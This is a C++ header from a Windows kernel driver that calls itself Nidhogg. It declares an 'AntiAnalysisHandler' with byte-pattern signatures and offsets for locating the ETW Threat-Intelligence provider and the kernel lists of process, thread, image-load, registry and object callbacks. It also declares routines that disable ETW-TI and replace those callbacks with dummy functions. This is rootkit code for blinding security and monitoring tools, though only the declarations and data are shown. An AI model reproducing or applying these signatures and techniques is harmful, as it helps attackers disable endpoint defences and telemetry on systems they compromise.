#pragma once
#include "pch.h"
#include "IoctlShared.h"

extern "C" {
	#include "WindowsTypes.h"
	#include "NidhoggCommon.h"
}
#include "MemoryAllocator.hpp"
#include "MemoryHelper.h"
#include "ListHelper.hpp"

constexpr UCHAR EtwThreatIntProvRegHandleSignature1[] = { 0x60, 0x4C, 0x8B, 0xCC };
constexpr UCHAR EtwThreatIntProvRegHandleSignature2[] = { 0xD2, 0x48, 0x8B, 0xCC };
constexpr UCHAR EtwThreatIntProvRegHandleSignature3[] = { 0x70, 0x48, 0x8B, 0xCC };
constexpr UCHAR EtwThreatIntProvRegHandleSignature4[] = { 0x4C, 0x8B, 0x15, 0xCC };

constexpr Pattern EtwThreatIntProvRegHandlePatterns[] = {
	{
		{WIN_1507, WIN_11_22H2},
		sizeof(EtwThreatIntProvRegHandleSignature1),
		EtwThreatIntProvRegHandleSignature1,
		0xCC,
		sizeof(EtwThreatIntProvRegHandleSignature1) - 1,
		false,
		1,
		{WIN_1507, WIN_11_22H2, 8}
	},
	{
		{WIN_1507, WIN_11_22H2},
		sizeof(EtwThreatIntProvRegHandleSignature2),
		EtwThreatIntProvRegHandleSignature2,
		0xCC,
		sizeof(EtwThreatIntProvRegHandleSignature2) - 1,
		false,
		1,
		{WIN_1507, WIN_11_22H2, 8}
	},
	{
		{WIN_1507, WIN_11_22H2},
		sizeof(EtwThreatIntProvRegHandleSignature3),
		EtwThreatIntProvRegHandleSignature3,
		0xCC,
		sizeof(EtwThreatIntProvRegHandleSignature3) - 1,
		false,
		1,
		{WIN_1507, WIN_11_22H2, 8}
	},
	{
		{WIN_11_22H2, WIN_11_24H2},
		sizeof(EtwThreatIntProvRegHandleSignature4),
		EtwThreatIntProvRegHandleSignature4,
		0xCC,
		sizeof(EtwThreatIntProvRegHandleSignature4) - 1,
		false,
		1,
		{WIN_11_22H2, WIN_11_24H2, 7}
	}
};
constexpr SIZE_T EtwThreatIntProvRegHandlePatternsCount = sizeof(EtwThreatIntProvRegHandlePatterns) / sizeof(Pattern);

constexpr UCHAR PspCreateProcessNotifyRoutineSignature[] = { 0x4C, 0x8D, 0xCC };
constexpr UCHAR PspCreateThreadNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
constexpr UCHAR PspLoadImageNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
constexpr UCHAR CallbackListHeadSignature[] = { 0x4C, 0x8D, 0xCC };
constexpr Pattern CallbackListHeadPattern = {
	{WIN_1507, WIN_11_24H2},
	sizeof(CallbackListHeadSignature),
	CallbackListHeadSignature,
	0xCC,
	sizeof(CallbackListHeadSignature),
	false
};
constexpr UCHAR CmpCallbackListLockSignature[] = { 0x48, 0x8D, 0xCC };
constexpr Pattern CmpCallbackListLockPattern = {
	{WIN_1507, WIN_11_24H2},
	sizeof(CmpCallbackListLockSignature),
	CmpCallbackListLockSignature,
	0xCC,
	sizeof(CmpCallbackListLockSignature),
	false
};
constexpr UCHAR CmpInsertCallbackInListByAltitudeSignature[] = { 0x8B, 0xCB, 0xE8, 0xCC };
constexpr Pattern CmpInsertCallbackInListByAltitudePattern = {
	{WIN_1507, WIN_11_24H2},
	sizeof(CmpInsertCallbackInListByAltitudeSignature),
	CmpInsertCallbackInListByAltitudeSignature,
	0xCC,
	sizeof(CmpInsertCallbackInListByAltitudeSignature) - 1,
	false
};
constexpr UCHAR CallFunctionSignature[] = { 0xE8, 0xCC };
constexpr Pattern CallFunctionPattern = {
	{WIN_1507, WIN_11_24H2},
	sizeof(CallFunctionSignature),
	CallFunctionSignature,
	0xCC,
	sizeof(CallFunctionSignature) - 1,
	false
};
constexpr UCHAR RoutinesListCountSignature1[] = { 0xF0, 0xFF, 0x05, 0xCC };
constexpr UCHAR RoutinesListCountSignature2[] = { 0x75, 0xCC, 0xF0, 0xFF, 0x05, 0xCC };
constexpr SIZE_T PsNotifyRoutinesRoutineCountOffset = 0xB;

constexpr Pattern RegistryCallbackListCountPattern = {
	{WIN_1507, WIN_11_24H2},
	sizeof(RoutinesListCountSignature1),
	RoutinesListCountSignature1,
	0xCC,
	sizeof(RoutinesListCountSignature1) - 1,
	false,
};

constexpr Pattern RoutinesListCountPatterns[] = {
	{
		{WIN_1507, WIN_11_22H2},
		sizeof(RoutinesListCountSignature1),
		RoutinesListCountSignature1,
		0xCC,
		sizeof(RoutinesListCountSignature1) - 1,
		false,
		1,
		{WIN_1507, WIN_11_22H2, PsNotifyRoutinesRoutineCountOffset}
	},
	{
		{WIN_11_22H2, WIN_11_24H2},
		sizeof(RoutinesListCountSignature2),
		RoutinesListCountSignature2,
		0xCC,
		sizeof(RoutinesListCountSignature2) - 1,
		false,
		1,
		{WIN_11_22H2, WIN_11_24H2, -3}
	}
};
constexpr SIZE_T RoutinesListCountPatternsCount = sizeof(RoutinesListCountPatterns) / sizeof(Pattern);

constexpr SIZE_T EtwThreatIntProvRegHandleDistance = 0x29D;
constexpr SIZE_T EtwGuidEntryOffset = 0x20;
constexpr SIZE_T CallbackListHeadSignatureDistance = 0xC4;
constexpr SIZE_T CmpCallbackListLockSignatureDistance = 0x4A;
constexpr SIZE_T CmpInsertCallbackInListByAltitudeSignatureDistance = 0x108;
constexpr SIZE_T CmpRegisterCallbackInternalSignatureDistance = 0x22;
constexpr SIZE_T PspSetCreateProcessNotifyRoutineSignatureDistance = 0x20;
constexpr SIZE_T PspSetCreateThreadNotifyRoutineSignatureDistance = 0xF;
constexpr SIZE_T PsSetLoadImageNotifyRoutineExDistance = 0xF;
constexpr SIZE_T PspCreateProcessNotifyRoutineDistance = 0xAA820;
constexpr SIZE_T PspCreateThreadNotifyRoutineDistance = 0x9B;
constexpr SIZE_T PspLoadImageNotifyRoutineDistance = 0x10B;
constexpr SIZE_T CallFunctionOffset = 5;
constexpr SIZE_T CmpInsertCallbackInListByAltitudeOffset = 7;
constexpr SIZE_T CmpCallbackListLockOffset = 7;
constexpr SIZE_T CallbacksListCountOffset = 7;
constexpr SIZE_T RoutinesListOffset = 7;
constexpr ULONG MAX_ROUTINES = 64;
constexpr SIZE_T ROUTINE_MASK = ~(1ULL << 3) + 1;

struct DisabledKernelCallback {
	LIST_ENTRY Entry;
	CallbackType Type;
	ULONG64 CallbackAddress;
	ULONG64 CallbackEntry;
};

struct CallbackList {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
	PUCHAR sigCallbackList;
	ULONG_PTR sigCallbackListLock;
	PULONG sigCallbackListCount;
};

OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(_In_ PVOID registrationContext, _Inout_ POB_PRE_OPERATION_INFORMATION info);
void ObPostOpenDummyFunction(_In_ PVOID registrationContext, _In_ POB_POST_OPERATION_INFORMATION info);
void CreateProcessNotifyExDummyFunction(_Inout_ PEPROCESS process, _In_ HANDLE processId, _Inout_opt_ PPS_CREATE_NOTIFY_INFO createInfo);
void CreateProcessNotifyDummyFunction(_In_ HANDLE parentId, _In_ HANDLE processId, _In_ BOOLEAN create);
void CreateThreadNotifyDummyFunction(_In_ HANDLE processId, _In_ HANDLE threadId, _In_ BOOLEAN create);
void LoadImageNotifyDummyFunction(_In_opt_ PUNICODE_STRING fullImageName, _In_ HANDLE processId, _In_ PIMAGE_INFO imageInfo);

_IRQL_requires_same_
_Function_class_(EX_CALLBACK_FUNCTION)
NTSTATUS RegistryCallbackDummyFunction(_In_ PVOID callbackContext, _In_opt_ PVOID argument1, _In_opt_ PVOID argument2);

class AntiAnalysisHandler {
private:
	CallbackList psRoutines;
	CallbackList obCallbacks;
	CallbackList cmCallbacks;
	ULONG prevEtwTiValue;

	_IRQL_requires_max_(APC_LEVEL)
	ULONG GetEtwProviderEnableInfoOffset() const;

	_IRQL_requires_max_(APC_LEVEL)
	ULONG GetEtwGuidLockOffset() const;

	_IRQL_requires_max_(APC_LEVEL)
	char* MatchCallback(_In_ PVOID callack);

	_IRQL_requires_max_(APC_LEVEL)
	bool AddCallback(_In_ DisabledKernelCallback& callback);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveCallback(_In_ DisabledKernelCallback* callback);

	_IRQL_requires_max_(APC_LEVEL)
	DisabledKernelCallback* FindCallback(_In_ IoctlKernelCallback& callback) const;

	_IRQL_requires_max_(APC_LEVEL)
	DisabledKernelCallback* FindCallback(_In_ DisabledKernelCallback& callback) const;

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ListAndReplacePsNotifyRoutines(_Inout_opt_ IoctlCallbackList<PsRoutine>* callbacks = nullptr, 
		_In_opt_ ULONG64 replacerFunction = 0, 
		_In_opt_ ULONG64 replacedFunction = 0);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlCallbackList<CmCallback>* callbacks = nullptr,
		_In_opt_ ULONG64 replacerFunction = 0, 
		_In_opt_ ULONG64 replacedFunction = 0);

public:
	void* operator new(size_t size) {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(APC_LEVEL)
	AntiAnalysisHandler();

	_IRQL_requires_max_(APC_LEVEL)
	~AntiAnalysisHandler();

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS EnableDisableEtwTI(_In_ bool enable);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS RestoreCallback(_In_ IoctlKernelCallback& callback);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS RestoreCallback(_Inout_ DisabledKernelCallback* callback);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ReplaceCallback(_In_ IoctlKernelCallback& callback);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ListObCallbacks(_Inout_ IoctlCallbackList<ObCallback>* callbacks);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ListPsNotifyRoutines(_Inout_ IoctlCallbackList<PsRoutine>* callbacks);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ListRegistryCallbacks(_Inout_ IoctlCallbackList<CmCallback>* callbacks);
};

inline AntiAnalysisHandler* NidhoggAntiAnalysisHandler;
